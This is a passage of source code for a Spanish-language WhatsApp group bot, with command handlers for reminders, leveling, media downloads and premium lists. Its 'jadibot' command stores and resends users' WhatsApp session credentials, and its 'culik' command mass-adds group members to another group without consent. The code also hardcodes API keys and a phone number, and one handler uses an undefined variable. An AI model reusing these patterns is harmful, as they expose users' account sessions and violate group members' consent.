┃│࿊⃟ ${prefix}neonc「 txt 」
┃│࿊⃟ ${prefix}newyear「 txt 」
┃│࿊⃟ ${prefix}newyear2「 txt 」
┃│࿊⃟ ${prefix}metals「 txt 」
┃│࿊⃟ ${prefix}xmas「 txt 」
┃│࿊⃟ ${prefix}blood「 txt 」
┃│࿊⃟ ${prefix}darkg「 txt 」
┃│࿊⃟ ${prefix}joker「 txt 」
┃│࿊⃟ ${prefix}wicker「 txt 」
┃│࿊⃟ ${prefix}natural「 txt 」
┃│࿊⃟ ${prefix}firework「 txt 」
┃│࿊⃟ ${prefix}skeleton「 txt 」
┃│࿊⃟ ${prefix}balloon「 txt 」
┃│࿊⃟ ${prefix}balloon2「 txt 」
┃│࿊⃟ ${prefix}balloon3「 txt 」
┃│࿊⃟ ${prefix}balloon4「 txt 」
┃│࿊⃟ ${prefix}balloon5「 txt 」
┃│࿊⃟ ${prefix}balloon6「 txt 」
┃│࿊⃟ ${prefix}balloon7「 txt 」
┃│࿊⃟ ${prefix}steel「 txt 」
┃│࿊⃟ ${prefix}gloss「 txt 」
┃│࿊⃟ ${prefix}denim「 txt 」
┃│࿊⃟ ${prefix}decorate「 txt 」
┃│࿊⃟ ${prefix}decorate2「 txt 」
┃│࿊⃟ ${prefix}peridot「 txt 」
┃│࿊⃟ ${prefix}rock「 txt 」
┃│࿊⃟ ${prefix}glass「 txt 」
┃│࿊⃟ ${prefix}glass2「 txt 」
┃│࿊⃟ ${prefix}glass3「 txt 」
┃│࿊⃟ ${prefix}glass4「 txt 」
┃│࿊⃟ ${prefix}glass5「 txt 」
┃│࿊⃟ ${prefix}glass6「 txt 」
┃│࿊⃟ ${prefix}glass7「 txt 」
┃│࿊⃟ ${prefix}glass8「 txt 」
┃│࿊⃟ ${prefix}captain_as2「 txt 」
┃│࿊⃟ ${prefix}robot「 txt 」
┃│࿊⃟ ${prefix}equalizer「 txt 」
┃│࿊⃟ ${prefix}toxic「 txt 」
┃│࿊⃟ ${prefix}sparkling「 txt 」
┃│࿊⃟ ${prefix}sparkling2「 txt 」
┃│࿊⃟ ${prefix}sparkling3「 txt 」
┃│࿊⃟ ${prefix}sparkling4「 txt 」
┃│࿊⃟ ${prefix}sparkling5「 txt 」
┃│࿊⃟ ${prefix}sparkling6「 txt 」
┃│࿊⃟ ${prefix}sparkling7「 txt 」
┃│࿊⃟ ${prefix}decorative「 txt 」
┃│࿊⃟ ${prefix}chocolate「 txt 」
┃│࿊⃟ ${prefix}strawberry「 txt 」
┃│࿊⃟ ${prefix}koifish「 txt 」
┃│࿊⃟ ${prefix}bread「 txt 」
┃│࿊⃟ ${prefix}matrix「 txt 」
┃│࿊⃟ ${prefix}blood2「 txt 」
┃│࿊⃟ ${prefix}neonligth2「 txt 」
┃│࿊⃟ ${prefix}thunder2「 txt 」
┃│࿊⃟ ${prefix}3dbox「 txt 」
┃│࿊⃟ ${prefix}neon2「 txt 」
┃│࿊⃟ ${prefix}roadw「 txt 」
┃│࿊⃟ ${prefix}bokeh「 txt 」
┃│࿊⃟ ${prefix}gneon「 txt 」
┃│࿊⃟ ${prefix}advanced「 txt 」
┃│࿊⃟ ${prefix}dropwater「 txt 」
┃│࿊⃟ ${prefix}wall「 txt 」
┃│࿊⃟ ${prefix}chrismast「 txt 」
┃│࿊⃟ ${prefix}honey「 txt 」
┃│࿊⃟ ${prefix}drug「 txt 」
┃│࿊⃟ ${prefix}marble「 txt 」
┃│࿊⃟ ${prefix}marble2「 txt 」
┃│࿊⃟ ${prefix}ice「 txt 」
┃│࿊⃟ ${prefix}juice「 txt 」
┃│࿊⃟ ${prefix}rusty「 txt 」
┃│࿊⃟ ${prefix}abstra「 txt 」
┃│࿊⃟ ${prefix}biscuit「 txt 」
┃│࿊⃟ ${prefix}wood「 txt 」
┃│࿊⃟ ${prefix}scifi「 txt 」
┃│࿊⃟ ${prefix}metalr「 txt 」
┃│࿊⃟ ${prefix}purpleg「 txt 」
┃│࿊⃟ ${prefix}shiny「 txt 」
┃│࿊⃟ ${prefix}jewelry「 txt 」
┃│࿊⃟ ${prefix}jewelry2「 txt 」
┃│࿊⃟ ${prefix}jewelry3「 txt 」
┃│࿊⃟ ${prefix}jewelry4「 txt 」
┃│࿊⃟ ${prefix}jewelry5「 txt 」
┃│࿊⃟ ${prefix}jewelry6「 txt 」
┃│࿊⃟ ${prefix}jewelry7「 txt 」
┃│࿊⃟ ${prefix}jewelry8「 txt 」
┃│࿊⃟ ${prefix}metalh「 txt 」
┃│࿊⃟ ${prefix}golden「 txt 」
┃│࿊⃟ ${prefix}glitter「 txt 」
┃│࿊⃟ ${prefix}glitter2「 txt 」
┃│࿊⃟ ${prefix}glitter3「 txt 」
┃│࿊⃟ ${prefix}glitter4「 txt 」
┃│࿊⃟ ${prefix}glitter5「 txt 」
┃│࿊⃟ ${prefix}glitter6「 txt 」
┃│࿊⃟ ${prefix}glitter7「 txt 」
┃│࿊⃟ ${prefix}metale「 txt 」
┃│࿊⃟ ${prefix}carbon「 txt 」
┃│࿊⃟ ${prefix}candy「 txt 」
┃│࿊⃟ ${prefix}metalb「 txt 」
┃│࿊⃟ ${prefix}gemb「 txt 」
┃│࿊⃟ ${prefix}3dchrome「 txt 」
┃│࿊⃟ ${prefix}metalb2「 txt 」
┃│
├┤⟨🌿⟩ ᴛᴇxᴛᴘʀᴏ2 ⟨🌿️⟩
┃┝━━━───•
┃│࿊⃟ ${prefix}halloween2「 txt1|txt2 」
┃│࿊⃟ ${prefix}horror「 txt1|txt2 」
┃│࿊⃟ ${prefix}game8bit「 txt1|txt2 」
┃│࿊⃟ ${prefix}layered「 txt1|txt2 」
┃│࿊⃟ ${prefix}glitch2「 txt1|txt2 」
┃│࿊⃟ ${prefix}coolg「 txt1|txt2 」
┃│࿊⃟ ${prefix}coolwg「 txt1|txt2 」
┃│࿊⃟ ${prefix}realistic「 txt1|txt2 」
┃│࿊⃟ ${prefix}space3d「 txt1|txt2 」
┃│࿊⃟ ${prefix}gtiktok「 txt1|txt2 」
┃│࿊⃟ ${prefix}stone「 txt1|txt2 」
┃│࿊⃟ ${prefix}marvel「 txt1|txt2 」
┃│࿊⃟ ${prefix}marvel2「 txt1|txt2 」
┃│࿊⃟ ${prefix}pornhub「 txt1|txt2 」
┃│࿊⃟ ${prefix}avengers「 txt1|txt2 」
┃│࿊⃟ ${prefix}metalr「 txt1|txt2 」
┃│࿊⃟ ${prefix}metalg「 txt1|txt2 」
┃│࿊⃟ ${prefix}metalg2「 txt1|txt2 」
┃│࿊⃟ ${prefix}halloween2「 txt1|txt2 」
┃│࿊⃟ ${prefix}lion「 txt1|txt2 」
┃│࿊⃟ ${prefix}wolf_bw「 txt1|txt2 」
┃│࿊⃟ ${prefix}wolf_g「 txt1|txt2 」
┃│࿊⃟ ${prefix}ninja「 txt1|txt2 」
┃│࿊⃟ ${prefix}3dsteel「 txt1|txt2 」
┃│࿊⃟ ${prefix}horror2「 txt1|txt2 」
┃│࿊⃟ ${prefix}lava「 txt1|txt2 」
┃│࿊⃟ ${prefix}bagel「 txt1|txt2 」
╰┼═════════════⊷
╭┤️⟨⚠️️⟩ 𝙸ɴғᴏʀᴍᴀᴄɪᴏɴ ⟨⚠️️⟩
┃│
┃│✙◗sᴘᴀᴍ = ʙᴀɴ
┃│✙◗ᴇɴʟᴀᴄᴇs = ʙᴀɴ
┃│✙◗ʙᴏᴛ ʙʏ ᴊᴏsᴇᴘʜ
┃╰═════════════⊷
╰─━━━─── • ───━━━━❋ཻུ۪۪⸙`
	
sendButLocation(from, `*ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄*`, `${iyiwi}`, {jpegThumbnail:ofrply}, [{buttonId:`owner`,buttonText:{displayText:'⎙ CREADORES'},type:1}], {contextInfo: { mentionedJid: [ptod,dtod,otod,stod]}})
break





		                case 'leveling':
			                if (isBanned) return  reply(mess.banned)
                if (!isGroup) return reply(mess.only.group)
		     if (!isGroupAdmins) return reply(mess.only.admin)			
                if (args.length < 1) return reply('#leveling 1/0?')
                if (args[0] === '1') {
                if (isLevelingOn) return reply('*La función de nivel ha estado activa antes*')
                 	   _leveling.push(from)
                 	   fs.writeFileSync('./database/group/leveling.json', JSON.stringify(_leveling))
                  	   reply(ind.lvlon())
              	  } else if (args[0] === '0') {
                  	  _leveling.splice(from, 1)
                 	   fs.writeFileSync('./database/group/leveling.json', JSON.stringify(_leveling))
                 	    reply('*La funcion de nivel ah sido desactivada*')
             	   } else {
                 	   reply(ind.satukos())
                	}
			
          break 
				case 'level':
				if (isBanned) return  reply(mess.banned)
                if (!isRegistered) return reply(ind.noregis())
                if (!isLevelingOn) return reply(ind.lvlnoon())
			     if (!isGroup) return reply(mess.only.group)			     
                 userLevl = getLevelingLevel(sender)
                 userp = getLevelingXp(sender)
                if (userLevl === undefined && userp === undefined) return reply(ind.lvlnul())
/*                const requiredXp = 5000 * (Math.pow(2, userLevl) - 1)*/
                resul = `
┏━━❉ *LEVEL* ❉━━
┣⊱ *Nombre* : ${pushname}
┣⊱ Numero : wa.me/${sender.split("@")[0]}
┣⊱ User XP :  ${userp}
┣⊱ User Level : ${userLevl}
┗━━━━━━━━━━━━`
                costum(resul, text, tescuk, per)
	
          break 

case 'simi':
teks = args.join(' ');
anu = await fetchJson(`https://api-alc.herokuapp.com/api/other/simi?text=${teks}&apikey=ConfuMods`)
res = anu.result;
reply(res)
break
case 'dellprem': 
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isGroup) return reply(mess.only.group)
if (!isOwner) return reply(mess.only.ownerB)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return 
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
let dellprem = body.slice(12)
let positio = prem.indexOf(dellprem)
prem.splice(positio, 1)
fs.writeFileSync('./database/json/premium.json', JSON.stringify(prem))
susp = `✖@${mentioned[0].split('@')[0]} fue removido de la lista de usuários premium✖`
mentions(`${susp}`, mentioned, true)   
break

                     case 'recordatorio':
				if (isBanned) return  reply(mess.banned)
                if (!isRegistered) return reply(ind.noregis())
        if (!c)

          return reply(

            `Use :\n${prefix}recordatorio text/2s\n\nNOTA: \n*s* - segundos\n*m* - minutos\n*h* - horas\n*d* - dias`

          );

        teks = args.join(' ');

        const messRemind = teks.split("/")[0];

        const timeRemind = teks.split("/")[1];

        typeRemind = "Texto";

        if (isQuotedImage) typeRemind = "Imagen";

        if (isQuotedSticker) typeRemind = "Sticker";

        if (isQuotedAudio) typeRemind = "Audio";

        if (!isQuotedImage && !isQuotedAudio && !isQuotedSticker)

          typeRemind = "Texto";

        const parsedTime = ms(toMs(timeRemind));

        reminder.addReminder(

          sender,

          messRemind,

          typeRemind,

          timeRemind,

          _reminder

        );

        if (!isQuotedImage && !isQuotedSticker && !isQuotedAudio) {

          await cnf.sendMessage(

            from,

            `── 「 RECORDATORIO 」 ──

    

Recordatorio activado con éxito!

➸ Mensaje: ${messRemind}

➸ Tipo: Texto

➸ Duracion: ${parsedTime.hours} Horas ${parsedTime.minutes} Minutos ${

              parsedTime.seconds

            } Segundos

➸ De: @${sender.split("@")[0]}

    `,

            text,

            { contextInfo: { mentionedJid: [sender] } }

          );

          const intervRemind = setInterval(async () => {

            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {

              anu = await reminder.getReminderMsg(sender, _reminder);

              cnf.sendMessage(

                from,

                `── 「 RECORDATORIO 」 ──

⏰ @${sender.split("@")[0]} ⏰

➸ Mensaje: ${messRemind}

➸ Tipo: ${reminder.getReminderType(sender, _reminder)}`,

                text,

                { contextInfo: { mentionedJid: [sender] } }

              );

              _reminder.splice(

                reminder.getReminderPosition(sender, _reminder),

                1

              );

              fs.writeFileSync(

                "./database/reminder.json",

                JSON.stringify(_reminder)

              );

              clearInterval(intervRemind);

            }

          }, 1000);

        } else if (isQuotedSticker) {

          encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))

            .message.extendedTextMessage.contextInfo;

          media = await cnf.downloadAndSaveMediaMessage(encmedia);

          await cnf.sendMessage(

            from,

            `── 「 RECORDATORIO 」 ──

    

¡Recordatorio activado con éxito!

➸ Mensaje: ${messRemind}

➸ Tipo: Sticker

➸ Duracion: ${parsedTime.hours} Horas ${parsedTime.minutes} Minutos ${

              parsedTime.seconds

            } Segundos

➸ De: @${sender.split("@")[0]}

    `,

            text,

            { contextInfo: { mentionedJid: [sender] } }

          );

          const intervRemind = setInterval(async () => {

            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {

              anu = await reminder.getReminderMsg(sender, _reminder);

              cnf.sendMessage(

                from,

                `── 「 RECORDATORIO 」 ──

⏰ @${sender.split("@")[0]} ⏰

➸ Mensaje: ${messRemind}

➸ Tipo: ${reminder.getReminderType(sender, _reminder)}`,

                text,

                { contextInfo: { mentionedJid: [sender] } }

              );

              cnf.sendMessage(from, fs.readFileSync(media), sticker);

              _reminder.splice(

                reminder.getReminderPosition(sender, _reminder),

                1

              );

              fs.writeFileSync(

                "./database/reminder.json",

                JSON.stringify(_reminder)

              );

              clearInterval(intervRemind);

            }

          }, 1000);

        } else if (isQuotedImage) {

          encmedia = isQuotedImage

            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message

                .extendedTextMessage.contextInfo

            : mek;

          media = await cnf.downloadAndSaveMediaMessage(encmedia);

          await cnf.sendMessage(

            from,

            `── 「 REMINDER 」 ──

    

¡Recordatorio activado con éxito!

➸ Mensaje: ${messRemind}

➸ Tipo: Imagen

➸ Duracion: ${parsedTime.hours} Horas ${parsedTime.minutes} Minutos ${

              parsedTime.seconds

            } Segundos

➸ De: @${sender.split("@")[0]}

    `,

            text,

            { contextInfo: { mentionedJid: [sender] } }

          );

          const intervRemind = setInterval(async () => {

            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {

              anu = await reminder.getReminderMsg(sender, _reminder);

              teks = `── 「 RECORDATORIO 」 ──

⏰ @${sender.split("@")[0]} ⏰

➸ Mensaje: ${messRemind}

➸ Tipo: ${reminder.getReminderType(sender, _reminder)}`;

              cnf.sendMessage(from, media, image, {

                contextInfo: { mentionedJid: [sender] },

                caption: teks,

              });

              _reminder.splice(

                reminder.getReminderPosition(sender, _reminder),

                1

              );

              fs.writeFileSync(

                "./database/reminder.json",

                JSON.stringify(_reminder)

              );

              clearInterval(intervRemind);

            }

          }, 1000);

        } else if (isQuotedAudio) {

          encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))

            .message.extendedTextMessage.contextInfo;

          media = await cnf.downloadAndSaveMediaMessage(encmedia);

          await cnf.sendMessage(

            from,

            `── 「 RECORDATORIO 」 ──

    

¡Recordatorio activado con éxito!

➸ Mensaje: ${messRemind}

➸ Tipo: Audio

➸ Duración: ${parsedTime.hours} Horas ${parsedTime.minutes} Minutos ${

              parsedTime.seconds

            } Segundos

➸ De: @${sender.split("@")[0]}

    `,

            text,

            { contextInfo: { mentionedJid: [sender] } }

          );

          const intervRemind = setInterval(async () => {

            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {

              anu = await reminder.getReminderMsg(sender, _reminder);

              cnf.sendMessage(

                from,

                `── 「 RECORDATORIO 」 ──

⏰ @${sender.split("@")[0]} ⏰

➸ Mensaje: ${messRemind}

➸ Tipo: ${reminder.getReminderType(sender, _reminder)}`,

                text,

                { contextInfo: { mentionedJid: [sender] } }

              );

              cnf.sendMessage(from, fs.readFileSync(media), audio, {

                contextInfo: { mentionedJid: [sender] },

                mimetype: "audio/mp4",

                ptt: true,

                caption: teks,

              });

              _reminder.splice(

                reminder.getReminderPosition(sender, _reminder),

                1

              );

              fs.writeFileSync(

                "./database/reminder.json",

                JSON.stringify(_reminder)

              );

              clearInterval(intervRemind);

            }

          }, 1000);

        }

        break;
        				case 'ytmp3':	
        								if (isBanned) return  reply(mess.banned)
                if (!isRegistered) return reply(ind.noregis())
        				  reply(mess.wait)
	  play = body.slice(6)    
	    
try {
  anu = await fetchJson(`https://api.zeks.me/api/joox?apikey=oCHDwj8ggZGBGjU5WIaK5Rctu6c&q=${play}`)
    if (anu.error) return reply(anu.error)
  lagu = await getBuffer(anu.data[0].audio)
  cnf.sendMessage(from, lagu, audio, {
  mimetype: 'audio/mp4', filename: `${play}.mp3`, quoted: mek})

              } catch {              
      
         reply('Lo siento ah ocurrido un error')
            }
          break
case 'addprem':
case 'df':
				if (isBanned) return  reply(mess.banned)
                if (!isRegistered) return reply(ind.noregis())
if (!isGroup) return reply(mess.only.group)
if (!isOwner) return reply(mess.only.ownerB)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return 
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
prem.push(`${mentioned}`)
fs.writeFileSync('./database/json/premium.json', JSON.stringify(prem))
reply(`👑@${mentioned[0].split('@')[0]} fue añadido a la lista de usuários premium👑`)
break
case 'ytmp4':  	
				if (isBanned) return  reply(mess.banned)
                if (!isRegistered) return reply(ind.noregis())	  
try {
                cnf.sendMessage(from, mess.wait, text,{quoted : mek})
                           
   
				play = args.join(" ")
     	    	
				anu = await fetchJson(`https://api-alphabot.herokuapp.com/api/downloader/youtube/video?url=${play}&apikey=offline`)
				if (anu.error) return reply(anu.error)
				buffer1 = await getBuffer(anu.results.result)		
				cnf.sendMessage(from, buffer1, video, {mimetype: 'video/mp4', filename: `${play}.mp4`, quoted: mek, caption: 'Aqui tienes 💕🦈'})				
                
                } catch {
                reply('Lo siento ah ocurrido un error')
           }

          break
          
  case 'yt-search':
  case 'yts':       
  case 'youtubesearch':
  				if (isBanned) return  reply(mess.banned)
                if (!isRegistered) return reply(ind.noregis())

 			if (args.length === 0) return reply(`*Ingrese el titulo de la cancion/video que desea que busque:)*`) 
  search = args.join(" ")
  
anu = await fetchJson(`https://api-alc.herokuapp.com/api/search/yts?query=${search}&apikey=${confukey}`)
	ytsrc = `*---- 「 YOUTUBE SEARCH 」----*
					
• Titulo : ${anu.titulo}

• ID : ${anu.id}

• Vistas: ${anu.vistas} 

• Duracion : ${anu.duracion}

• Canal : ${anu.canal_name}

• Canal : ${anu.canal_link}

• Video Link : ${anu.link}

• Desc : ${anu.descripcion}`

var buffer = await getBuffer(anu.thumb)
              cnf.sendMessage(from, buffer, image, {quoted: mek, caption: ytsrc})                  
break

  case 'wattpad-search':
  case 'wattpadsrch':       
  case 'wattpad':
  				if (isBanned) return  reply(mess.banned)
                if (!isRegistered) return reply(ind.noregis())

 			if (args.length === 0) return reply(`*Ingrese el titulo de la cancion/video que desea que busque:)*`) 
  search = args.join(" ")
  
anu = await fetchJson(`https://api-alc.herokuapp.com/api/search/wattpad?query=${search}&apikey=${confukey}`)


	wttsrch = `*---- 「 WATTPAD SEARCH 」----*
					
• Titulo : ${anu.result[0].judul}

• Lectores : ${anu.result[0].dibaca}

• Link : ${anu.result[0].url}

• Desc : ${anu.result[0].description}`

var buffer = await getBuffer(anu.result[0].thumb)
              cnf.sendMessage(from, buffer, image, {quoted: mek, caption: wttsrch})                  
break


case 'frase':
case 'frases':
				if (isBanned) return  reply(mess.banned)
                if (!isRegistered) return reply(ind.noregis())

anu = await fetchJson(`https://api-alc.herokuapp.com/api/other/frases?apikey=${confukey}`)
reply(`Frase : ${anu.frase}
By : ${anu.by}`)
break


          
/*          case 'ytmp3': 
			if (args.length === 0) return reply(`*${prefix}ytmp3* _Url YouTube_`)
			if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply('Link no válido!')
			var mulaikah = args.join(' ')
			await reply(mess.wait)
                xa.Youtube(mulaikah).then(async (data) => {
                    let txt = `*----「 YOUTUBE MP3 」----*\n\n`
                    txt += `*• Quality :* ${data.medias[7].quality}\n`
                    txt += `*• Type :* ${data.medias[7].extension}\n`
                    txt += `*• Size :* ${data.medias[7].formattedSize}\n`
                    txt += `*• Url Source :* ${data.url}\n\n`
                    txt += `*Mohon tunggu sebentar kak, sedang proses pengiriman...*`
                    sendFileFromUrl(from, data.thumbnail, txt, mek)
                    sendFileFromUrl(from, data.medias[7].url, '', mek)
                    })
                .catch((err) => {
                    reply('error')
                })
                break
case 'ytmp4': 
			if (args.length === 0) return reply(`*${prefix}ytmp3* _Url YouTube_`)
			if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply('Error!')
			var mulaikah = args.join(' ')
			xa.Youtube(mulaikah).then(async (data) => {
                    let txt = `*----「 YOUTUBE VIDEO 」----*\n\n`
                    txt += `*• Calidad :* ${data.medias[1].quality}\n`
                    txt += `*• Type :* ${data.medias[1].extension}\n`
                    txt += `*• Size :* ${data.medias[1].formattedSize}\n`
                    txt += `*• Url Source :* ${data.url}\n\n`
                    txt += `*Mohon tunggu sebentar kak, sedang proses pengiriman...*`
                    sendFileFromUrl(from, data.thumbnail, txt, mek)
                    sendFileFromUrl(from, data.medias[1].url, 'uwu', mek)
                    }).catch((err) => {
                    reply('error')
                })
                break
*/
              
           case 'play': 
           case 'song':
           				if (isBanned) return  reply(mess.banned)
                if (!isRegistered) return reply(ind.noregis())

  if(!c) return reply('Que musica deseas buscar?')           
 	    	try {
			if (args.length === 0) return reply(`Enviar *${prefix}play* _Happier Than Ever_`)
			var srch = args.join(' ')
				    	
  anu = await fetchJson(`https://api-alc.herokuapp.com/api/search/yts?query=${srch}&apikey=ConfuMods`)
 	
						const captions = `*---- 「 PLAY MUSIC 」----*
					
• Titulo : ${anu.titulo}

• ID : ${anu.id}

• Vistas: ${anu.vistas} 

• Duracion : ${anu.duracion}

• Link : ${anu.link}`

var thumbyt = await getBuffer(anu.thumb)

sendButLocation(from, captions, 'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', thumbyt, [{buttonId: `.ytmp4 ${anu.link}`, buttonText: {displayText: 'Video'}, type: 1},{buttonId: `.ytmp3 ${anu.link}`, buttonText:{displayText: 'Audio'}, type: 1}], {quoted: mek})
						
		              } catch {
             reply('Lo siento ah ocurrido un error')
            }
			break

                
/*case 'simi':
					if (args.length < 1) return cnf.sendMessage(from, `¿si?`, text, { quoted: mek })				
                teks = args.join(' ')                
	simi = await fetchJson(`https://api.simsimi.net/v2/?text=${teks}&lc=es`)             
                     const sami = simi.success
                 es = ['es']    
                     const gtts = require('./lib/gtts')('es')				
                     var dtt = sami
					ranm = getRandom('.mp3')
					dtt.length > 600
					? reply('El texto es muy largo T×T')
					: gtts.save(ranm, dtt, function() {
						cnf.sendMessage(from, fs.readFileSync(ranm), audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
						fs.unlinkSync(ranm)
					})
					break*/

//FIN
case 'jadibot':
case 'serbot':
case 'instalarbot':
case 'qrcode':
case 'qr':
				if (isBanned) return  reply(mess.banned)
                if (!isRegistered) return reply(ind.noregis())
if(from.endsWith('@g.us')) return reply('Solo se puede utilizar en pv')
client.version = [2, 2143, 3]
client.browserDescription = ['AlcatrazBot 2','Desktop','3.0']
if (args[0] && args[0].length > 200) {
	let json = Buffer.from(args[0], 'base64').toString('utf-8')
    let obj = JSON.parse(json)
    await client.loadAuthInfo(obj)
}
try {
client.on('qr' ,async qr => {
qrbot = await qrkode.toDataURL(qr, { scale: 8 })
buffqr = await Buffer.from(qrbot.split('data:image/png;base64,')[1], 'base64')
await fs.writeFileSync(`./jadibot@${sender}.jpg`, buffqr)
let scen = await cnf.sendMessage(from, fs.readFileSync(`./jadibot@${sender}.jpg`), MessageType.image, {quoted : mek,caption: '¡Escanea este QR para convertirte en un bot temporal!\n1. Haga clic en los tres puntos en la esquina superior derecha.\n2. Toca WhatsApp Web\n3. Escanea este QR \n\nEl QR caduca en 20 segundos'})    
setTimeout(() => {
       cnf.deleteMessage(from, scen.key)
  }, 30000);
})  
client.on ('open', async () => {
  console.log ('credentials update')
  const authInfo = client.base64EncodedAuthInfo()
  fs.writeFileSync(`./sampah/${sender}.json`, JSON.stringify(authInfo  ,null, '\t'))
  await client.sendMessage('0@s.whatsapp.net', `Puede iniciar sesión sin qr con el siguiente mensaje`, MessageType.extendedText)
  client.sendMessage('0@s.whatsapp.net', `${prefix}${command} ${Buffer.from(JSON.stringify(authInfo)).toString('base64')}`, MessageType.extendedText)
})
client.on('chat-update', async (chat) => {
	require('./cnf.js')(client, chat)
})    
await client.connect().then(async ({user}) => {
reply('Conectado exitosamente con WhatsApp.*\n' + JSON.stringify(user, null, 2))
})
} catch {
reply('¡Error! solo 1 persona puede acceder a la función Jadibot')
}
break
case 'stopjadibot':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
try {
reply('Okay')
fs.unlinkSync(`./sampah/${sender}.json`)
client.close()
} catch {
reply('Listo')
client.close()
}
break
case 'culik':
				if (isBanned) return  reply(mess.banned)
                if (!isRegistered) return reply(ind.noregis())
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (args.length < 1) return reply('_*Ingrese la identificación del grupo*_')
let pantek = []
for (let i of groupMembers) {
pantek.push(i.jid)
}
cnf.groupAdd(args[0], pantek)
break

       case 'owner':
        case 'wner':
        case 'creador':
        case 'creator':
        case 'developer':
		case 'author':
		case 'creadores':
		case 'desarrolladores':
		case 'desarolladores':
		case 'developer':
	   case 'developers':
	   
////////////////HIRO-BEET

const vcHiro = 'BEGIN:VCARD\n' 
            + 'VERSION:3.0\n' 
            + 'FN:ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛𖤐᭄\n' 
            + 'ORG:Owner;\n' 
            + 'TEL;type=CELL;type=VOICE;waid=436703061433499:+436703061433499\n' 
            + 'END:VCARD' 
////////////////ABADON
/*
const vcAbadon = 'BEGIN:VCARD\n' 
            + 'VERSION:3.0\n' 
            + 'FN:Abadon\n' 
            + 'ORG:Estilista;\n' 
            + 'TEL;type=CELL;type=VOICE;waid=573225236629:+573225236629\n' 
            + 'END:VCARD' 
*/
                  cnf.sendMessage(`${sender.split('@')[0]}@s.whatsapp.net`, `Cualquier duda o inquietud, ahi tienes el número de mi creador.`, MessageType.text, { quoted: mek })
                  cnf.sendMessage(`${sender.split('@')[0]}@s.whatsapp.net`, {displayname: "ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛𖤐᭄", vcard: vcHiro}, MessageType.contact, { quoted: mek})
                  cnf.sendMessage(`${sender.split('@')[0]}@s.whatsapp.net`, {displayname: "Abadon", vcard: vcAbadon}, MessageType.contact, { quoted: mek})
if(!isGroup) return
reply('Te enviado el número de mi creador a tu priv!')
break
  
case 'addcmd': 
case 'setcmd':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (isQuotedSticker) {
if (!c) return reply(`Usar : ${command} comando y Etiqueta sticker`)
var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
addCmd(kodenya, c)
reply("Listo")
} else {
reply('Etiqueta un sticker')
}
break
case 'delcmd':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (!isQuotedSticker) return reply(`Usa : ${command} Etiqueta un sticker`)
var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
scommand.splice(getCommandPosition(kodenya), 1)
fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand))
reply("Listo")
break
case 'listcmd':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
let teksnyee = `\`\`\`「 LISTA DE CMD 」\`\`\``
let cemde = [];
for (let i of scommand) {
cemde.push(i.id)
teksnyee += `\n\n*⬣ ID :* ${i.id}\n*⬣ Cmd :* ${i.chats}`
}
reply(teksnyee)
break

      case 'igstory': 
      				if (isBanned) return  reply(mess.banned)
                if (!isRegistered) return reply(ind.noregis())

              if(!c) return reply('*Usuario?*')
              hx.igstory(c)
             .then(async result => {
              for(let i of result.medias){
              if(i.url.includes('mp4')){
              let link = await getBuffer(i.url)
              cnf.sendMessage(from,link,video,{quoted: mek,caption: `Tipo : ${i.type}`})
              } else {
              let link = await getBuffer(i.url)
              cnf.sendMessage(from,link,image,{quoted: mek,caption: `Tipo : ${i.type}`})                  
              }
              }
              });
              break
case 'ig':
case 'igdl':
case 'instagram':
				if (isBanned) return  reply(mess.banned)
                if (!isRegistered) return reply(ind.noregis())

if (!c) return reply('Link?')
var { igDownloader } = require('./lib/igdown')
   res = await igDownloader(`${c}`).catch(e => {
reply(mess.error.api)
})
console.log(res)
sendMediaURL(from,`${res.result.link}`,`${res.result.desc}`)
                    break
                    case 'tiktok':
                   case 'tiktokdl':
                   case 'tiktoknowm':
                   				if (isBanned) return  reply(mess.banned)
                if (!isRegistered) return reply(ind.noregis())

if (!c) return reply('Link?')
var { TiktokDownloader } = require('./lib/tiktokdl')
reply(mess.wait)


res = await TiktokDownloader(`${c}`).catch(e => {
reply(mess.error.api)
})
sendMediaURL(from, `${res.result.nowatermark}`)
break
                    case 'tourl':
                    				if (isBanned) return  reply(mess.banned)
                if (!isRegistered) return reply(ind.noregis())

    if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            owgi = await cnf.downloadMediaMessage(boij)
            res = await upload(owgi)
            reply(res)
            } else {
            reply('Etiqueta  imágen/video')
            }
            break
case 'viewonce':
				if (isBanned) return  reply(mess.banned)
                if (!isRegistered) return reply(ind.noregis())

res = await cnf.prepareMessageFromContent(from,{
